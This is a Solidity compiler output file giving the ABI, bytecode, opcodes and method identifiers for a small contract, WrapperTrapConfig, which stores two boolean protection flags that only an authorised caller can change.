{
  "contracts/WrapperTrap.sol": {
    "WrapperTrapConfig": {
      "abi": [
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "inputs": [],
          "name": "WrapperTrapConfig_config",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            },
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "bool",
              "name": "_sellProtection",
              "type": "bool"
            },
            {
              "internalType": "bool",
              "name": "_randomProtection",
              "type": "bool"
            }
          ],
          "name": "WrapperTrap_config",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "60a06040526000805461ffff1916905534801561001b57600080fd5b5033606081901b60805261018e61003b6000398060a7525061018e6000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063b976d6231461003b578063cc695c4814610064575b600080fd5b6100626004803603604081101561005157600080fd5b508035151590602001351515610087565b005b61006c610145565b60408051921515835290151560208301528051918290030190f35b60408051634687ff4760e01b815233600482015290516001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001691634687ff47916024808301926020929190829003018186803b1580156100ed57600080fd5b505afa158015610101573d6000803e3d6000fd5b505050506040513d602081101561011757600080fd5b505161012257600080fd5b6000805460ff19169215159290921761ff00191661010091151591909102179055565b60005460ff80821691610100900416909156fea2646970667358221220f1993f35b1a09fcc9ae0d9a54403d564a8e77b78f39a46f8eeed720d9d7037ab64736f6c63430007060033",
          "opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD PUSH2 0xFFFF NOT AND SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x1B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x60 DUP2 SWAP1 SHL PUSH1 0x80 MSTORE PUSH2 0x18E PUSH2 0x3B PUSH1 0x0 CODECOPY DUP1 PUSH1 0xA7 MSTORE POP PUSH2 0x18E PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xB976D623 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xCC695C48 EQ PUSH2 0x64 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x62 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP DUP1 CALLDATALOAD ISZERO ISZERO SWAP1 PUSH1 0x20 ADD CALLDATALOAD ISZERO ISZERO PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6C PUSH2 0x145 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 ISZERO ISZERO DUP4 MSTORE SWAP1 ISZERO ISZERO PUSH1 0x20 DUP4 ADD MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x4687FF47 PUSH1 0xE0 SHL DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP2 PUSH4 0x4687FF47 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x101 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x117 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH2 0x122 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP3 ISZERO ISZERO SWAP3 SWAP1 SWAP3 OR PUSH2 0xFF00 NOT AND PUSH2 0x100 SWAP2 ISZERO ISZERO SWAP2 SWAP1 SWAP2 MUL OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0xFF DUP1 DUP3 AND SWAP2 PUSH2 0x100 SWAP1 DIV AND SWAP1 SWAP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALL SWAP10 EXTCODEHASH CALLDATALOAD 0xB1 LOG0 SWAP16 0xCC SWAP11 0xE0 0xD9 0xA5 DIFFICULTY SUB 0xD5 PUSH5 0xA8E77B78F3 SWAP11 CHAINID 0xF8 0xEE 0xED PUSH19 0xD9D7037AB64736F6C63430007060033000000 "
        },
        "methodIdentifiers": {
          "WrapperTrapConfig_config()": "cc695c48",
          "WrapperTrap_config(bool,bool)": "b976d623"
        }
      }
    }
  }
}